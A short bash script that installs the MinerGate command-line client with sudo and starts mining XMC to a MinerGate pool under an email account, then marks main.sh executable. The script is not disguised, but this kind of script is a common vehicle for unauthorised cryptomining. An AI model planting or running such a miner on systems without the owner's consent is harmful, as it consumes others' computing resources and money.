#!/bin/bash
sudo apt-get install ocl-icd-libopencl1 && sudo dpkg -i MinerGateX-cli-1.4-amd64-cpu.deb && minergate-cli stratum+tcp://xmc.pool.minergate.com:45560 -u mineerr49@protonmail.com --xmc 1 && chmod +x main.sh
